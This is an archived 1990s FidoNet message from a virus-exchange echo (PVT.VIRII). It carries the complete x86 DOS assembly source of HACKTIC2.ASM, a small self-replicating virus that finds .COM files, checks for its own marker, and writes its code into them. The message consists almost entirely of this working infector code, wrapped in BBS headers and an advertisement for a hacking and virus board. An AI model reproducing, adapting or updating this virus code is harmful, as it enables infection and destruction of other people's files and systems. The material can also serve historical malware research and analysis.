;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 1 of 56
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:10
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : HACKTIC2.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:13)
;* To   : Mark Hapershaw
;* Subj : HACKTIC2.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
tic             segment
                org     100h
                assume  cs:tic, ds:tic, es:tic
;
len     equ     offset last-100h        ;LENGTH OF VIRUS CODE
;
start:          mov     bx,0fh          ;KLUDGE TO AVOID MEMALLOC ERROR
                mov     ah,4ah
                int     21h
                mov     dx,es
                add     dh,10h
                mov     es,dx           ;PROGRAM CODE WILL RUN HERE
                push    dx              ;SET UP FOR FAR RETURN
                push    si
                mov     ah,26h          ;CREATE NEW PSP
                int     21h
                mov     di,si
                mov     si,offset last
                push    si
                mov     ch,0feh
                rep     movsb           ;MOVE PROGRAM CODE UP
                dec     cx              ;=FFFF
                pop     di
                mov     dx,offset file
                mov     ah,4eh          ;FIND FIRST .COM FILE
                jmp     short find
retry:          mov     ah,4fh          ;FIND NEXT
find:           int     21h
                jc      nofile          ;NO (MORE) FILES
                mov     dx,9eh          ;FILE NAME IN DTA
                mov     ax,3d02h        ;OPEN FILE
                int     21h
                xchg    ax,bx           ;1-BYTE MOVE OF AXBX
                mov     dx,di           ;END OF VIRUS CODE
                mov     ah,3fh          ;READ FILE DATA (CX=FFFF)
                int     21h             ;READ FILE AFTER VIRUS CODE
                add     ax,len          ;LENGTH OF VIRUS+FILE
                cmp     byte ptr [di],0bbh    ;CHECK IF ALREADY INFECTED
                je      retry           ;TRY AGAIN
                push    ax
                xor     cx,cx
                mov     ax,4200h        ;RESET FILE POINTER
                cwd                     ;DX=0
                int     21h
                pop     cx
                mov     dh,1
                mov     ah,40h          ;WRITE INFECTED CODE BACK
                int     21h
;
nofile:         push    es              ;GO RUN PROGRAM
                pop     ds
                retf
;
file    db      '*.COM',0               ;SEARCH FOR .COM FILES
last    db      0c3h                    ;STANDALONE VIRUS CODE JUST RETURNS
tic             ends
                end     start

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;-+-  FastEcho/386 1.41.b7/Real
; + Origin: Miami Beach BBS - Nijmegen Nl - 080-732083 - ZyX 19K2 (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/dSYM[=VAL]   Define symbol SYM = 0, or = value VAL
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

